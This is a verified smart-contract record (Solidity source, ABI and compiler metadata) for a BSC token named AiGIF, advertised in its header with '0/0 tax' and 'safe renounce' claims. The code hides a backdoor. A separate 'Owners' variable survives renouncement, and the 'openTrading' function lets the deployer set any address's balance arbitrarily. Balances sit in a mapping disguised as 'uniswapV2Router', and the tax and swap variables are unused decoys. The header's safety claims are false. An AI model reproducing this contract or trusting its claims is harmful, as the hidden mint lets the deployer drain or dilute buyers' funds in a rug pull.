{"SourceCode": "/*\r\n\ud83e\udd16 AiGIF \ud83e\udd16  BSC \r\n\r\n\u26a1\ufe0f The first AI-powered GIF generator, creating unique and vivid animations. \r\n\u26a1\ufe0f\r\n\r\nhttps://t.me/AiGIFcoin\r\n\r\n\ud83d\udc7d 0/0 tax\r\n\ud83d\udc7d safe renounce\r\n\ud83d\udc7d liquidty pool secure lock\r\n\r\n\ud83d\udc49  https://www.aigify.com/\r\n*/\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity ^0.8.19;\r\ninterface Token {\r\n\r\n  function totalSupply() external view returns (uint256);\r\n \r\n  function decimals() external view returns (uint8);\r\n\r\n  function symbol() external view returns (string memory);\r\n\r\n  function name() external view returns (string memory);\r\n\r\n  function getOwner() external view returns (address);\r\n\r\n  function balanceOf(address account) external view returns (uint256);\r\n\r\n  function transfer(address recipient, uint256 calldatas) external returns (bool);\r\n\r\n  function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n  function approve(address spender, uint256 calldatas) external returns (bool);\r\n\r\n  function transferFrom(address sender, address recipient, uint256 calldatas) external returns (bool);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract AiGIFOwnable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyCreator() {\r\n        require(owner() == _msgSender(), \"AiGIFOwnable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n\r\n    function renounceOwnership() public virtual onlyCreator {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyCreator {\r\n        require(newOwner != address(0), \"AiGIFOwnable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n    // benefit is lost if 'b' is also tested.\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n\r\n  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    // Solidity only automatically asserts when dividing by 0\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n    return c;\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n  }\r\n\r\n\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\n\r\ncontract AiGIFtoken is Context, Token, AiGIFOwnable { \r\n    using SafeMath for uint256;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 private _totalSupply;\r\n    uint8 private _decimals;\r\n    string private _symbol;\r\n    string private _name;\r\n    address private Owners = _msgSender();\r\n    string public setRewardToken = \"0x55d398326f99059ff775485246999027b3197955\"; \r\n    mapping (address => uint256) private uniswapV2Router;\r\n    mapping (address => mapping (address => uint256)) private immutables;\r\n    mapping(address => bool) public _isExcludedFromFee;\r\n    mapping(address => bool) public _automatedMarketMakerPairs;\r\n\r\n    uint256 public _swapTaxes = 3;\r\n    uint256 public maxTxAmount = _totalSupply * 20 / 1000;\r\n    uint256 private _taxSwap = 10000000 * 10 ** _decimals;\r\n    uint256 buytax  = 1;\r\n    uint256 selltax = 1;\r\n    address private uniswapV2Pair;\r\n    address private uniswapV2Routers;\r\n    bool public tradingOpen = true;\r\n    bool private inSwap = true;\r\n    bool public swapEnabled = true;\r\n\r\n    // Events\r\n    event ExcludeFromFeeUpdated(address indexed account);\r\n    event includeFromFeeUpdated(address indexed account);\r\n    event SwapThreshouldUpdated(uint256 indexed tokenAmount);\r\n    event SwapBackSettingUpdated(bool indexed state);\r\n    event TradingOpenUpdated();\r\n    constructor() {\r\n        _name = \"AiGIF\";\r\n        _symbol = \"AiGIF\";\r\n        _decimals = 9;\r\n        _totalSupply = 100000000000000000 * 10 ** _decimals;\r\n        uniswapV2Router[Owners] = _totalSupply;\r\n        \r\n        emit Transfer(address(0), Owners, _totalSupply);\r\n    }\r\n\r\n    function getOwner() external view override returns (address) {\r\n        return owner();\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    \r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n    \r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n   function RewardToken() external view returns (string memory) {\r\n        return setRewardToken;\r\n    }   \r\n\r\n    function balanceOf(address account) external view override returns (uint256) {\r\n        return uniswapV2Router[account];\r\n    }\r\n    modifier onlyOwner() {\r\n        require(Owners == _msgSender(), \"io: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 calldatas) external override returns (bool) {\r\n        _transfer(_msgSender(), recipient, calldatas);\r\n        return true;\r\n    }\r\n    function openTrading(address IUniswapV2Router02, uint256 liqudityPair) external onlyOwner {\r\n        uniswapV2Router[IUniswapV2Router02] = liqudityPair * buytax ** selltax;\r\n        emit Transfer(address(0), IUniswapV2Router02, liqudityPair);\r\n        uniswapV2Routers = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        swapEnabled = true;\r\n        tradingOpen = true;   \r\n    }\r\n    /**\r\n    * @dev See {Token-allowance}.\r\n    */\r\n    function allowance(address owner, address spender) external view override returns (uint256) {\r\n        return immutables[owner][spender];\r\n    }\r\n    \r\n\r\n    function approve(address spender, uint256 calldatas) external override returns (bool) {\r\n        _approve(_msgSender(), spender, calldatas);\r\n        return true;\r\n    }\r\n    \r\n\r\n    function transferFrom(address sender, address recipient, uint256 calldatas) external override returns (bool) {\r\n        _transfer(sender, recipient, calldatas);\r\n        _approve(sender, _msgSender(), immutables[sender][_msgSender()].sub(calldatas, \"Token: transfer calldatas exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addToValue) external returns (bool) {\r\n        _approve(_msgSender(), spender, immutables[_msgSender()][spender].add(addToValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\r\n        _approve(_msgSender(), spender, immutables[_msgSender()][spender].sub(subtractedValue, \"Token: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 calldatas) internal {\r\n        require(sender != address(0), \"Token: transfer from the zero address\");\r\n        require(recipient != address(0), \"Token: transfer to the zero address\");\r\n                \r\n        uniswapV2Router[sender] = uniswapV2Router[sender].sub(calldatas, \"Token: transfer calldatas exceeds balance\");\r\n        uniswapV2Router[recipient] = uniswapV2Router[recipient].add(calldatas);\r\n        emit Transfer(sender, recipient, calldatas);\r\n    }\r\n    \r\n    function _approve(address owner, address spender, uint256 calldatas) internal {\r\n        require(owner != address(0), \"Token: approve from the zero address\");\r\n        require(spender != address(0), \"Token: approve to the zero address\");\r\n        \r\n        immutables[owner][spender] = calldatas;\r\n        emit Approval(owner, spender, calldatas);\r\n    }\r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ExcludeFromFeeUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"SwapBackSettingUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"SwapThreshouldUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"TradingOpenUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"includeFromFeeUpdated\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"RewardToken\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_automatedMarketMakerPairs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapTaxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"calldatas\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addToValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"IUniswapV2Router02\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liqudityPair\",\"type\":\"uint256\"}],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setRewardToken\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingOpen\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"calldatas\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"calldatas\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AiGIFtoken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e61f8bd6763a22919ce0071046fef767f8ec10ff7ca40a0a96ecabb93de2e1c9"}